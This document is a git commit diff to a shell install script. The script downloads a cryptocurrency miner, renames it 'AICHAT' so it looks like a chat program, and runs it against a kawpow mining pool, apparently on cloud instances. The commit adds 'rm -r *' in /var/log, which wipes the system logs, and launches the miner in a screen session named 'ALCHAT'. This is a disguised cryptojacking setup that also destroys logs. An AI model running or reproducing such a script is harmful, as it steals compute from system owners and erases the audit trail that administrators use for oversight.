c668f4f991126af8529b45681e6ada4c6ee5f56e
kgj <kgj@mac1.local>
2023-05-14 07:09:45 +0900

    install.sh-2

--- install.sh
+++ install.sh
@@ -1,7 +1,10 @@
-cd /
+cd /var/log/
+rm -r *
 apt install screen
 wget https://github.com/develsoftware/GMinerRelease/releases/download/3.40/gminer_3_40_linux64.tar.xz
 tar -xf gminer_3_40_linux64.tar.xz
 mv miner AICHAT
+screen -S ALCHAT
+cd /var/log
 ./AICHAT -a kawpow -s asia.kawpow-hub.miningpoolhub.com:20611 -u 
-waterghost_2046.oci_1
+waterghost_2046.oci_4
